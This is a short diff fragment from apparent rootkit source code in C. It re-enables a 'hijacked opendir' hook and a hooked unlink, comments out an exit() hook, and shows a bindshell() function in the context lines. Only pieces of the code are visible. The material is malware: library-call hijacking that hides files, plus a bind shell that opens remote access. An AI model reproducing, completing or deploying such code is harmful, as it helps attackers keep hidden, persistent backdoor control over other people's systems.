@@ -98,7 +98,7 @@ int bindshell()
     return 0;  
 }
 
-/*
+
 DIR     *opendir(const char *name) //our hijacked opendir
 {
  	void  *handle; 
@@ -172,7 +172,7 @@ int unlink(const char *pathname){
 	}
 
 }
-*/
+/*
 void exit(int status){
 
 	void *handle;
@@ -188,4 +188,5 @@ void exit(int status){
   		return (sym(status));
 	}
 
-}
+}*/
+
